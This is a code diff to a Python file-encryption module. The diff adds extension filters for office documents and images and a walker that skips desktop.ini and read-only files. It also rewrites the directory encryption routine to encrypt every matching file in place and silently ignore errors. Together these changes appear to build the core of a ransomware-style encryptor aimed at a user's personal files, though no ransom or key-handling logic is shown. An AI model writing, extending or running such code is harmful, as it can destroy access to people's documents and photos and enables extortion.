@@ -1,7 +1,37 @@
 import os
 import time
 from cryptography.hazmat.primitives.ciphers import algorithms, modes, Cipher
+from pathlib import Path 
 
+#filter extensions
+DOCUMENT_EXTENSIONS = {
+    ".txt", ".pdf", ".doc", ".docx",
+    ".xls", ".xlsx", ".ppt", ".pptx"
+}
+
+IMAGE_EXTENSIONS = {
+    ".jpg", ".jpeg", ".png", ".gif",
+    ".bmp", ".webp"
+}
+
+def iter_allowed_files(base_dir):
+    base_dir = Path(base_dir)
+
+    for root, _, files in os.walk(base_dir):
+        for name in files:
+            path = Path(root) / name
+            ext = path.suffix.lower()
+
+            # Windows system file
+            if name.lower() == "desktop.ini":
+                continue
+
+            # Skip non-writable files
+            if not os.access(path, os.W_OK):
+                continue
+
+            if ext in DOCUMENT_EXTENSIONS or ext in IMAGE_EXTENSIONS:
+                yield path
 
 def encrypt_file(file_path, key):
     #ensure parameter contain path
@@ -41,12 +71,12 @@ def decrypt_file(file_path, key):
 
 
 #directory level
-def encrypt_directory(dir_path, key):
-    for root, _, files in os.walk(dir_path):
-        for filename in files:
-            file_path = os.path.join(root, filename)
-            encrypt_file(file_path, key)
-
+def encrypt_directory(target_dir, key):
+    for file_path in iter_allowed_files(target_dir):
+        try:
+            encrypt_file(file_path, key)  # your existing function
+        except Exception:
+            continue
 
 def decrypt_directory(dir_path, key):
     for root, _, files in os.walk(dir_path):
